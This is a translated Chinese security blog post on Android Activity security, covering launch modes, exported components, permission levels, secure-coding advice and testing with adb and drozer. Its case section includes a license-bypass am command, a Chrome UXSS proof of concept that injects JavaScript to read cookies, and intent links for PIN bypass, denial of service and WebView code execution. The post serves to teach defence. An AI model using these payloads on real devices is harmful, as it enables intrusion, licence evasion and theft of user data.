---
published: true
title: Android Activtity Security
layout: post
---
Author:[瘦蛟舞](http://drops.wooyun.org/author/瘦蛟舞)

    Drops is one of the greatest platforms for security-related technical blogs in China. We dedicate to translate every amazing post into English and push it to this website, meanwhile we would be very honored if you could submit your atricles at drops@wooyun.org.



#0x00 Background Knowledge
-----

Each Android Application is made up of Activity, Service, Content Provider and Broadcast Receiver, which are the basic components of Android. Among those components, An Activity is the main body of an application and performs most of the display and interaction work. Even to some extent, an “interface” is an Activity.

An activity is a visual user interface on which users can perform some actions. For instance, an Activity can display a menu list for user to choose and some pictures that contain descriptions. A SMS application can include an Activity to display the contacts list as the recipient, an Activity to write messages to the chosen recipient, and an Activity to view recent messages or change settings. Altogether, they compose a cohesive user interface. But each Activity is independent. And each is an implementation of subclass based on Activity parent class.

An application can have one or more Activities, such as the SMS application that we mentioned. Of course, the function and the number of each Activity is naturally determined by the application and its design. Normally, there is always an application marked as the first application that the user would see when starting. If an Activity needs to shift to another, the current Activity will launch the next one.

#0x01 Key points
-------
Reference: http://developer.Android.com/Guide/components/activities.HTML 

**Time-to-Live**

![image](https://quip.com/blob/edcAAAmcC2M/0-58tAlAQTbNlPrEFxfeaA?s=xYFkAvn63ajW)

**Start Method**

Explicit start

Components are registered in the configuration file

    <activity android:name=".ExampleActivity" android:icon="@drawable/app_icon">
        <intent-filter>
            <action android:name="android.intent.action.MAIN" />
            <category android:name="android.intent.category.LAUNCHER" />
        </intent-filter>
    </activity>

Directly use intent object to specify the application and Activity to launch.

    Intent intent = new Intent(this, ExampleActivity.class);
    startActivity(intent);

If the action attribute of intent-filter is not configured, an activity can only use explicit start.

Private Activity is recommend to use implicit start.

Implicit start

    Intent intent = new Intent(Intent.ACTION_SEND);
    intent.putExtra(Intent.EXTRA_EMAIL, recipientArray);
    startActivity(intent);

**launch mode**

Activities have four types of launch mode:

* **Standard**: The default behavior.  Each time an Activity is started, the system will create a new instance in target tasks.
* **SingleTop**: If an instance of the target Activity already exists at the top of a stack of the new task, the system will use this instance directly and call onNewIntent () of this Activity (not create).
* **SingleTask**: Creates an instance of activity at the top of a stack of the new task. If the instance already exists, the system will directly use this instance and call onNewIntent () of this Activity (not create).
* **SingleInstance**: Similar to "singleTask", the difference is that no other Activity will run in the task of target Activity but just one Activity will run in this task.

Set locations to android:launchMode attribute of the Activity element in the AndroidManifest.xml file:

    <activity android:name="ActB" android:launchMode="singleTask"></activity>

Activity launch mode is used to control task-creating and Activity instances. The default is "standard" mode. Every time the Standard mode is launched, a new Activity instance will be generated without creating a new task. The launched and launching Activities are in the same stack.  When a new task is created, there is a chance that malware can read the contents in intent. Therefore, it's recommended to use standard mode if you have no special requirements. That's to say, don't configure the attributes of launch mode. The flag of intent can overwrite launchMode.

**taskAffinity**

Task manages Activity in Android. Task name depends on the affinity of the root Activity.

By default, every application will use the name of app package as an affinity. And the app determines the allocation of Task. As a result, all Activities in the next app are in the same task by default. To change the allocation of Task, you can set affinity values in the AndroidManifest.xml file. But when doing so, a different task would be launched, which may cause the risk that the information on intent would be read by other apps.

**FLAG_ACTIVITY_NEW_TASK**

This is an important flag in intent .

When Activity gets started, you can set the flag in intent by using setFlags() or addFlags() to change launch mode. The FLAG_ACTIVITY_NEW_TASK is used to create a new task (the launched Activity is neither in foreground nor background). FLAG_ACTIVITY_MULTIPLE_TASK and FLAG_ACTIVITY_NEW_TASK can be simultaneously set. In this case, a task is sure to be created, so intent will not carry any sensitive data.

**Task**

Stack: Activity does a lot of display and interaction work. From a certain angle, the applications we see is actually a combination of  Activity. To avoid chaos when they work together, Android platform has designed a stack mechanism to manage Activities. This mechanism follows the principle that the first in the last out. The system will always displays the activity on the top of the stack and  the one on the bottom is the last to open.

Task: is used to group related Activity and manage activities in a way as Activity stack. From the perspective of user experience, an "application" is a Task, but fundamentally, a Task can be made up of one or more Android Applications.

If a user leaves a task for a long time, the system would clean the Activity not on the top. Thus, when task is reopened, the Activity on the top of the stack is recovered.

![image](https://quip.com/blob/edcAAAmcC2M/RP8sZzciSjLGhK2tZup3MA?s=xYFkAvn63ajW)

**Intent Selector**

There is a circumstance that more than one Activity may contain a same action. When such an action is called,  a selector will pop up for user to pick.

**Permissions**

android:exported

This property determines whether an Activity component can be launched by external applications. When it's set to true, Activity can be started by an external application. However, when it's set to false,  Activity can only be launched by its own app. (same  user ID or root can launch)

Exported is set to false by default, if the action property of intent-filter is not configured ( without filter,  you have to start the activity by explicit class names, which means the program can only be launched by itself), otherwise, exported is set to true by default.

Exported property is used to limit the Activity not to expose to other apps.  Setting the permission statements in configuration files can also limit external apps from starting an Activity.

    android:protectionLevel

http://developer.android.com/intl/zh-cn/guide/topics/manifest/permission-element.html

![image](https://quip.com/blob/edcAAAmcC2M/NWoLHUFcFYm12c8tB2xfqg?s=xYFkAvn63ajW)

![image](https://quip.com/blob/edcAAAmcC2M/O3iaUH53b_nqDtcdS_ECxA?s=xYFkAvn63ajW)

Normal: default value. This is a lower risk permission. The system grants this type of permission to a requesting application at install without asking for user's approval.

Dangerous: like WRITE_SETTING and SEND_SMS, these permissions are risky, because these permissions can be used to reconfigure the device, or lead charges. This protection Level is used to identify some permissions that the user concerns. Android would display related permissions to the user at install. The specific actions vary from Android versions and devices.

Signature: these permissions are only granted to the requesting applications signed with the same certificate as the application that declared the permission

SignatureOrSystem: similar to signature class, except for the fact that applications in Android image also require permission. In this case, applications that vendors build in system can still be granted with permission. This protection level is helpful to integrate system compiling process.

    <!-- *** POINT 1 *** Define a permission with protectionLevel="signature" -->
    <permission
    android:name="org.jssec.android.permission.protectedapp.MY_PERMISSION"
    android:protectionLevel="signature" />
    <application
    android:icon="@drawable/ic_launcher"
    android:label="@string/app_name" >
    <!-- *** POINT 2 *** For a component, enforce the permission with its permission attribute -->
    <activity
    android:name=".ProtectedActivity"
    android:exported="true"
    android:label="@string/app_name"
    android:permission="org.jssec.android.permission.protectedapp.MY_PERMISSION" >
    <!-- *** POINT 3 *** If the component is an activity, you must define no intent-filter -->
    </activity>

**Key methods**

* onCreate(Bundle savedInstanceState)
* setResult(int resultCode, Intent data)
* startActivity(Intent intent)
* startActivityForResult(Intent intent, int requestCode)
* onActivityResult(int requestCode, int resultCode, Intent data)
* setResult (int resultCode, Intent data)
* getStringExtra (String name)
* addFlags(int flags)
* setFlags(int flags)
* setPackage(String packageName)
* getAction()
* setAction(String action)
* getData()
* setData(Uri data)
* getExtras()
* putExtra(String name, String value)

#0x02 The type of Activities

-----

The type of Activity and its usage very much determine its risk and defense methods. So Activities can be categorized into:  Private、Public、Partner、In-house.

![image](https://quip.com/blob/edcAAAmcC2M/42rjALnkbZcK1nXmxPvGJA?s=xYFkAvn63ajW)

private activity

An private activity that cannot be launched by another application, and therefore is the safest activity.

creating the activity:

1. Don't  specify the taskAffinity//task to manage activities. Task name depends on the affinity of the root activity. An Activity uses the package name for affinity in default settings. Tasks are assigned by app, so the Activity of an application, by default, belongs to the same task. When starting an Activity in another task, the intent may be read by other apps.

2. Don't specify lunchMode//by default standard, recommended that you use the default. Other applications may read the contents of the intent when creating a new task.

3. Set exported property to false.

4. Handle the received data from the intent carefully,  whether the intent is sent internally.

5. Sensitive information can only be handled in the app.

using the activity:

6. Don't set FLAG_ACTIVITY_NEW_TASK when opening an activity.//FLAG_ACTIVITY_NEW_TASK \is used to create a new task (started Activity is not found on the stack).

7. Use explicit start to launch the activity in an app.

8. save sensitive information to Intent by using putExtra, the activity should belong to the application itself.

9. Handle the returned data carefully, data can be from the same app.

public activity

 Exposed activity components can be launched by any application.

creating the activity:

1. Set the exported property to true.

2. be carefully with intent.

3. The returned data should not contain sensitive information

using the activity:

4. Don't send sensitive information/

5. Handle the returned data carefully.

Partner, in-house parts, see http://www.jssec.org/DL/android_securecoding_en.PDF 

**Security recommendations**

* Private Activity used in apps should not configure intent-filter. If intent-filter is configured, exported property needs to be false.
* Use the default taskAffinity
* Use the default launchMode
* Don't set FLAG_ACTIVITY_NEW_TASK  when starting an activity
* Handle the received intent and its information carefully
* Verify the signature of internal (in-house) app
* When the Activity returns data , you should pay attention to whether the target Activity would disclose information risks.
* The target Activity uses explicit start when it's clear.
* Handle the returned data carefully. The target activity may return data forged by malware.
* Verify if the target Activity is a malicious app, in case of intent cheat. You can use signature hash to verify.
* When Providing an Asset Secondhand, the Asset should be Protected with the Same Level of Protection
* Do not send sensitive information. The intent information of public activity can be read by malware.

#0x04 Test Method
-----

Viewing the activity:

* Decompile,and view  the activity component in AndroidManifest.xml (pay attention to configured intent-filter and exported is not set to false.
* Use RE to open the app after install to view the configuration file directly.
* Use Drozer scan to: run app.activity.info -a packagename
* Dynamic view: logcat sets the tag of filter to ActivityManager

launching the activity:

* adb shell：am start -a action -n package/componet
* drozer:  run app.activity.start --action android.action.intent.VIEW ...
* Write your own app to call startActiviy () or startActivityForResult ()
* remotely start browser's intent scheme: http://drops.wooyun.org/tips/2893

#0x05 Cases


----------


**Case 1: bypass the local authentication**

[WooYun: local bypass Huawei Netdisk Android client  (non-root)](http://www.wooyun.org/bugs/wooyun-2014-048502)

Bypass McAfee's key authentication for free activation.

    $ am start -a android.intent.action.MAIN -n com.wsandroid.suite/com.mcafee.main.MfeMain

![image](https://quip.com/blob/edcAAAmcC2M/Ry6ieRDzBmoeAxv92dtcPA?s=xYFkAvn63ajW)

**Case 2: local denial of service**

[WooYun: Kuaiwan browser Android client local denial of service](http://www.wooyun.org/bugs/wooyun-2014-060423)

[WooYun: Snowball Android client local denial of service vulnerability](http://www.wooyun.org/bugs/wooyun-2013-036581)

[WooYun: Tencent Messenger(QQ) Dos vulnerability(critical)](http://www.wooyun.org/bugs/wooyun-2014-048176)

[WooYun: Tencent WeiBo multiple Dos vulnerabilities(critical)](http://www.wooyun.org/bugs/wooyun-2014-048501)

[WooYun: Android native Settings application has collapse problem (can cause a denial of service attack)](http://www.wooyun.org/bugs/wooyun-2014-077688)(involving the fragment)

**Case 3: interface hijacking**

[WooYun: Android uses floating windows to hijack interface for fishing pilfer](http://www.wooyun.org/bugs/wooyun-2012-05478)

**Case 4:UXSS**

an vulnerbility in Android Chrome v18.0.1025123，class "com.google.android.apps.chrome.SimpleChromeActivity" - allows a malicious application to inject JS code to any domain. Part of the AndroidManifest.xml is as follows:

    <activity android:name="com.google.android.apps.chrome.SimpleChromeActivity" android:launchMode="singleTask" android:configChanges="keyboard|keyboardHidden|orientation|screenSize">
            <intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
    </activity>

Class "com.google.android.apps.chrome.SimpleChromeActivity" is configured,   but "Android:exported" is not set to "false". Malicious applications first call the class and set the data as "http://Google.com" . After that, set data to malicious js when the class is called again, for example 'javascript:alert(document.cookie)'. The malicious code will execute in domain http://Google.com. "Com.google.android.apps.chrome. SimpleChromeActivity" class can be opened by Android API or am (activityManager). POC is as follows

    public class TestActivity extends Activity {
        @Override
        public void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            Intent i = new Intent();
                    ComponentName comp = new ComponentName(
                                     "com.android.chrome",
                                        "com.google.android.apps.chrome.SimpleChromeActivity");
                    i.setComponent(comp);
                    i.setAction("android.intent.action.VIEW");
                    Uri data = Uri.parse("http://google.com");
                    i.setData(data);
    
                    startActivity(i);
    
                        try {
                            Thread.sleep(5000);
                            }
                              catch (Exception e) {}
    
                    data = Uri.parse("javascript:alert(document.cookie)");  
                    i.setData(data);
    
                    startActivity(i);
        }
    }

**Case 5:implicit starting intent contains sensitive data**

N/a public case, the attack model is as shown below.

![image](https://quip.com/blob/edcAAAmcC2M/laqpzWJWfIZAhQBDv3ZAow?s=xYFkAvn63ajW)

**Case 6:Fragment injecting (bypassing the PIN+ denial of service)**

Fragment may be explained in another article, so I just mentioned it here.

    <a href="intent:#Intent;S.:android:show_fragment=com.android.settings.ChooseLockPassword$ChooseLockPasswordFragment;B.confirm_credentials=false;launchFlags=0x00008000;SEL;action=android.settings.SETTINGS;end">
    16、bypass Pin android 3.0-4.3 （selector）
    </a><br>

![image](https://quip.com/blob/edcAAAmcC2M/pVEr-atKaZbIgM5PnEgIkQ?s=xYFkAvn63ajW)

    <a href="intent:#Intent;S.:android:show_fragment=XXXX;launchFlags=0x00008000;SEL;component=com.android.settings/com.android.settings.Settings;end">
    17、fragment dos android 4.4 (selector)
    </a><br>

![image](https://quip.com/blob/edcAAAmcC2M/J0zUohQEnvMqb1lW6Jvy2Q?s=xYFkAvn63ajW)

**Case 7:WebView RCE**

    <a href="intent:#Intent;component=com.gift.android/.activity.WebViewIndexActivity;S.url=http://drops.wooyun.org/webview.html;S.title=WebView;end">
    15、驴妈妈代码执行（fixed）
    </a><br>

![image](https://quip.com/blob/edcAAAmcC2M/EH66J5e53bss-0A-lzvAmQ?s=xYFkAvn63ajW)

![image](https://quip.com/blob/edcAAAmcC2M/r6YcTMmorJ7gfFU-ATkRjQ?s=xYFkAvn63ajW)

#0x06 reference
------------

http://www.jssec.org/dl/android_securecoding_en.pdf